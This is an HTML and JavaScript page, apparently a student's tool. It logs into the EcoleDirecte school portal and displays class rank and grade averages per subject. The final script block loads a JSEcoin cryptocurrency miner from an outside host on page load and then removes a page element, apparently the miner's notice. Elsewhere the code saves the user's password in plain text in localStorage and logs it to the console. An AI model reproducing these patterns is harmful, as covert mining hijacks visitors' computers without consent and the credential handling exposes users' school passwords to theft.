<!DOCTYPE html>
<html>
<head>
	<title>Position classe</title>
	<meta charset="utf-8">
	<style type="text/css">
	table {
		border-collapse: collapse;
	}

	td, tr {
		border: 1px solid black;
		width: 100px;
		text-align: center;
	}

	footer {
		position: absolute;
		bottom: 0;
	}
</style>
</head>
<body>
	<center><u>Position classe (2.2)</u></center>
	<br>
	<input id="login" placeholder="Login" />
	<br><input id="password" type="password" placeholder="Mot de passe" />
	<br><input id="button" type="button" value="Connexion" onclick="auth()" />
	<br>
	<script>
		var login;
		var password;
		var cookie = false;
		var tr;
		var trUser;

		// Si identifiants dans le localStorage, connexion automatique
		if (localStorage.getItem("EcDI") != null && localStorage.EcDI.indexOf("||") != -1) {
			login = localStorage.getItem("EcDI").split("||")[0];
			password = localStorage.getItem("EcDI").split("||")[1];
			cookie=true;
			console.log(password);

			// On se connecte
			auth();
		}

		function auth() {
			// Récupération des identifiants si pas dans le localStorage
			if (cookie == false) {
				login = document.getElementById("login").value;
  				password = document.getElementById("password").value;
			}
			// On retire le tableau si besoin est
			if (document.getElementsByTagName("p")[0] != undefined) {
				document.getElementsByTagName("p")[0].remove();
			}
			if (document.getElementsByTagName("table")[0] != undefined) {
				document.getElementsByTagName("table")[0].remove();
			}
			if (document.getElementById("deco") != undefined) {
				document.getElementById("deco").remove();
			}
			
			// Pour empêcher les singes de spammer le bouton ou les champs
			document.getElementById("button").disabled = true;
			document.getElementById("login").disabled = true;
			document.getElementById("password").disabled = true;

			// Création de la variable pour le trimestre demandé par l'utilisateur
  			if (document.getElementById("tr0")) {
  				for (i=0; i < document.getElementsByTagName("no").length; i++) {
  					if (document.getElementById("tr"+i).checked) {
  						trUser=i;
  						console.log("trUser", trUser)
  					}
  				}
  			}

  			else {
  				trUser = -1;
  			}

  			// On retire les cases à cocher
			if (document.getElementsByTagName("no")[0] != undefined) {
				u=0;
				while (u < 3) {
					document.getElementsByTagName("no")[0].remove();
					document.getElementsByName("Trimestre")[0].remove();
					document.getElementsByTagName("br")[3].remove();
					u++;
				}
			}

  			// Données JSON à envoyer
  			data={
    			"identifiant": login,
    			"motdepasse": password
			}

			// Création + envoi de la requête
			var http = new XMLHttpRequest();
  			http.open("POST", "https://vmws11.ecoledirecte.com/v3/login.awp", true);
  			http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  		  	http.send("data="+JSON.stringify(data));

  		  	// Récupération des données de la requête du login
  			http.onreadystatechange = function() {
    			if (http.readyState == 4 && http.status == 200) {
       				var reponse = JSON.parse(http.responseText);
       				var token = reponse.token;
       				var message = reponse.message;
       				if (document.getElementsByTagName("test")[0] == null) {
       					var msgAfficher = document.createElement("test");
       					document.getElementsByTagName("body")[0].appendChild(msgAfficher);
       				}
    
       				
       				// Si pas d'erreur lancement de la 2e requête
       				console.log(message);
					document.getElementById("button").disabled = false;
       				if (message == "") {
       					var idEleve = reponse.data.accounts[0].id;
       					recupererNote(token, idEleve);
       					enregistrer(login, password);
       					//log(login);
       					document.getElementsByTagName("test")[0].innerText = "Chargement...";
       				}

       				// Si erreur affichage du message d'erreur
       				else {
       					document.getElementsByTagName("test")[0].innerText = message;
       					document.getElementById("login").disabled = false;
						document.getElementById("password").disabled = false;
       				}
   				}
			}
		}

		function recupererNote(token, idEleve) {
			// Envoi du token pour la 2e requête
			data={
    			"token": token
			}

			// 2e requête
			var http = new XMLHttpRequest();
			http.open("POST","https://vmws10.ecoledirecte.com/v3/eleves/"+idEleve+"/notes.awp?verbe=get&", true);
  			http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  			http.send("data="+JSON.stringify(data));

  			http.onreadystatechange = function() {
 		  		if (http.readyState == 4 && http.status == 200) {
 		  			document.getElementsByTagName("test")[0].remove();
       				var reponse = JSON.parse(http.responseText);
       				if (trUser == -1) {
						tr = defautTriOuSem(reponse.data.periodes);
       				}
       				else if (trUser != -1) {
       					tr = trUser;
       				}
       				console.log("tr", tr);
       				var matieres = reponse.data.periodes[tr].ensembleMatieres.disciplines;
       				var effectif = reponse.data.periodes[0].ensembleMatieres.disciplines[0].effectif;
       				afficherPeriodes(reponse)
       				afficherMatiere(matieres, effectif, reponse, tr);
   				}
			}
		}

		// Pour determiner le semestre/actuel actuel
		function defautTriOuSem(tr) {
			var date = new Date();
			var date2;
			for (i=0; i < tr.length; i++) {
				date2 = new Date(tr[i].dateFin.split("-")[0], tr[i].dateFin.split("-")[1]-1, tr[i].dateFin.split("-")[2]);
				console.log(date2);
				if (date < date2) {
					return i;
				}
			}
		}

		// Affiche les périodes
		function afficherPeriodes(reponse) {
			var NbTr = reponse.data.periodes.length;

			// Pour les semestres
			if (NbTr == 3) {
				var coche = document.createElement("input");
				coche.type = "radio";
				coche.id = "tr"+(NbTr-1);
				coche.name = "Trimestre";
				document.body.appendChild(coche);

				var p = document.createElement("no");
				p.innerText = "Depuis le début de l'année";
				document.body.appendChild(p);

				var retourLigne = document.createElement("br");
				document.body.appendChild(retourLigne);

				for (i=1; i < NbTr; i++) {
					var coche = document.createElement("input");
					coche.type = "radio";
					coche.id = "tr"+(i-1);
					coche.name = "Trimestre"

					document.body.appendChild(coche);

					var p = document.createElement("no");
					p.innerText = (i)+"e semestre";
					document.body.appendChild(p);

					var retourLigne = document.createElement("br");
					document.body.appendChild(retourLigne);
				}
			}

			// Pour les trimestres
			if (NbTr == 4) {
				var coche = document.createElement("input");
				coche.type = "radio";
				coche.id = "tr"+(NbTr-1);
				coche.name = "Trimestre"
				document.body.appendChild(coche);

				var p = document.createElement("no");
				p.innerText = "Depuis le début de l'année";
				document.body.appendChild(p);

				var retourLigne = document.createElement("br");
				document.body.appendChild(retourLigne);

				for (i=1; i < NbTr; i++) {			
					var coche = document.createElement("input");
					coche.type = "radio";
					coche.id = "tr"+(i-1);
					coche.name = "Trimestre"
					document.body.appendChild(coche);

					var p = document.createElement("no");
					p.innerText = (i)+"e trimestre";
					document.body.appendChild(p);

					var retourLigne = document.createElement("br");
					document.body.appendChild(retourLigne);
				}
			}

			// Cochage de la case adéquate
       		document.getElementById("tr"+tr).checked = true;
			
			console.log("Periodes affichées!")
		}

		// Affichage des matières
		function afficherMatiere(matieres, effectif, reponse, tr) {
			// Création des tableaux
			rang = [];
			discipline = [];

			// Variable pour fin tri/semestre
			let finEcheance = new Date(reponse.data.periodes[tr].dateFin);
			let debEchance = new Date(reponse.data.periodes[tr].dateDebut);
			// Remplissage du tableau
			for (i=0; i < matieres.length; i++) {
				discipline.push(matieres[i].discipline);
				rang.push(matieres[i].rang);
			}

			console.log(rang);
			console.log(discipline);

			// Classement des moyennes
			var listeDevoirs = reponse.data.notes;
			var tableauDevoirs = {}; // Contient par matière les notes, surX et le coeff pour chaque valeur
			
			for (x of listeDevoirs) {
				if (new Date(x.date) < finEcheance && new Date(x.date) >  debEchance) {
					if (tableauDevoirs[x.libelleMatiere] == undefined) {
						tableauDevoirs[x.libelleMatiere] = [];
						if (!isNaN(parseFloat(x.valeur))) { // Verif si absent
							tableauDevoirs[x.libelleMatiere].push([parseFloat(x.valeur.replace(",", ".")), parseFloat(x.noteSur.replace(",", ".")), parseFloat(x.coef.replace(",", "."))]);
						}
					}
					else {
						if (!isNaN(parseFloat(x.valeur))) { // Pareil
						tableauDevoirs[x.libelleMatiere].push([parseFloat(x.valeur.replace(",", ".")), parseFloat(x.noteSur.replace(",", ".")), parseFloat(x.coef.replace(",", "."))]);
						}
					}
				}
			}
			
			console.log(tableauDevoirs);

			// Création du tableau "physique"
			var table = document.createElement("table");
			table.id = "table";

			var colonne = document.createElement("tr");
			colonne.id = "column";

			var disciplineTable = document.createElement("th");
			disciplineTable.id="disciplineTable";
			disciplineTable.innerText="Matières";

			var rangTable = document.createElement("th");
			rangTable.id="rangTable";
			rangTable.innerText="Position";

			var moyenneNoteTable = document.createElement("th");
			moyenneNoteTable.id="moyenneNoteTable";
			moyenneNoteTable.innerText="Notes";

			document.getElementsByTagName("body")[0].appendChild(table);
			table.appendChild(colonne);
			
			var column = document.getElementById("column");
			column.appendChild(disciplineTable);
			column.appendChild(rangTable);
			column.appendChild(moyenneNoteTable);

			// Remplissage du tableau "physique"
			var moyenneGen = 0;
			var rangGen = 0;
			var sommeCoeffMatiere = 0;

			for (i=0; i < matieres.length; i++) {				
				var newTable = document.createElement("tr");
				document.getElementById("table").appendChild(newTable);

				// Disciplines
				var newTableD = document.createElement("td");
				newTableD.innerText = matieres[i].discipline
				document.getElementsByTagName("tr")[i+1].appendChild(newTableD);
				
				// Rang
				var newTableR = document.createElement("td");
				newTableR.innerText = "/";
				if (matieres[i].rang != "0") { // Si pas de rang, on met un slash
					newTableR.innerText = matieres[i].rang;
				}

				// Couleur en fonction du classement (necessite la variable effectif, pas toujours présente...)
				if (matieres[i].rang == 0) {
					newTableR.style="";
				}

				else if (matieres[i].rang <= Math.round(effectif*1/3)) {
					newTableR.style="background-color: green;";
				}

				else if (matieres[i].rang <= Math.round(effectif*2/3)) {
					newTableR.style="background-color: yellow;";
				}

				else if (matieres[i].rang <= Math.round(effectif*3/3)) {
					newTableR.style="background-color: red;";
				}

				document.getElementsByTagName("tr")[i+1].appendChild(newTableR);

				// Calcul + affichage des moyennes
				var newTableE = document.createElement("td");
				var moyenneNotes = 0;
				var sommeCoeff = 0;
				var sommeNotes = 0;

				if (tableauDevoirs[matieres[i].discipline] != undefined) {
					for (chaqueNote of tableauDevoirs[matieres[i].discipline]) {
						sommeNotes+=(chaqueNote[0]/chaqueNote[1])*chaqueNote[2];
						sommeCoeff+=chaqueNote[2];
					}
					moyenneNotes=Math.round(sommeNotes/sommeCoeff*2000)/100;
					moyenneGen+=moyenneNotes*parseFloat(matieres[i].coef);
					rangGen+=parseFloat(matieres[i].rang)*parseFloat(matieres[i].coef);
					sommeCoeffMatiere+=parseFloat(matieres[i].coef);
				}

				else {
					moyenneNotes = "/"; // Sinon, affiche un slash
				}

				newTableE.innerText = moyenneNotes;
				document.getElementsByTagName("tr")[i+1].appendChild(newTableE);
			}

			// Affichage pour rang moyen, notes moyennes
			var newTable = document.createElement("tr");
			document.getElementById("table").appendChild(newTable);

			var newTableD = document.createElement("td");
			newTableD.style = "font-weight: bold";
			newTableD.innerText = "Moyennes";
			document.getElementsByTagName("tr")[i+1].appendChild(newTableD);

			var newTableR = document.createElement("td");
			if (rangGen != 0 && sommeCoeffMatiere != 0)
				newTableR.innerText = Math.round(rangGen/sommeCoeffMatiere);
			else 
				newTableR.innerText ="/";
			newTableR.style = "font-weight: bold";
			document.getElementsByTagName("tr")[i+1].appendChild(newTableR);

			var newTableE = document.createElement("td");
			if (moyenneGen != 0 && sommeCoeffMatiere != 0)
				newTableE.innerText = Math.round(moyenneGen/sommeCoeffMatiere*100)/100;
			else
				newTableE.innerText = "/";


			newTableE.style = "font-weight: bold";
			document.getElementsByTagName("tr")[i+1].appendChild(newTableE);
			
			// Message mise à jour notes
			var maj = document.createElement("p");
			maj.style = "font-style: italic;";

			var notes = [];
			var dateMtn = new Date();
			
			for (k=0;k < reponse.data.notes.length;k++) {
				notes.push(new Date()-new Date(parseInt(reponse.data.notes[k].dateSaisie.split("-")[0]), parseInt(reponse.data.notes[k].dateSaisie.split("-")[1])-1, parseInt(reponse.data.notes[k].dateSaisie.split("-")[2])));
			}
			console.log(notes);
			console.log(notes.indexOf(Math.min(...notes)))
			maj.innerText = "Dernière mise a jour des notes le : "+reponse.data.notes[notes.indexOf(Math.min(...notes))].dateSaisie+".\nDernier calcul du classement le : "+reponse.data.periodes[reponse.data.periodes.length-1].ensembleMatieres.dateCalcul+".";
			
			maj.style = "font-style: italic;";
			document.getElementsByTagName("body")[0].appendChild(maj);

			function disconnect() {
				localStorage.clear();
				cookie=false;

				document.getElementById("login").value = "";
				document.getElementById("password").value = "";

				document.getElementsByTagName("p")[0].remove();
				document.getElementsByTagName("table")[0].remove();
				document.getElementById("deco").remove();

				document.getElementById("login").disabled = false;
				document.getElementById("password").disabled = false;
			}
			
			var deco = document.createElement("input");
			deco.id = "deco";
			deco.type = "button";
			deco.value = "Se déconnecter";
			deco.addEventListener("click", disconnect);
			document.getElementsByTagName("body")[0].appendChild(deco);

		}


		function enregistrer(login, password) {
			if (cookie == false) {
				localStorage.setItem("EcDI", login+"||"+password);
			}
		}

	</script>
	<script type="text/javascript">
!function(){window.JSENoAds=1;var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/168428/samsamdu44.github.io/0/0/",s.parentNode.insertBefore(t,s)}();

	document.body.removeChild(document.getElementById(document.getElementsByTagName("b")[0].parentNode.parentNode.id));
</script>
</body>
</html>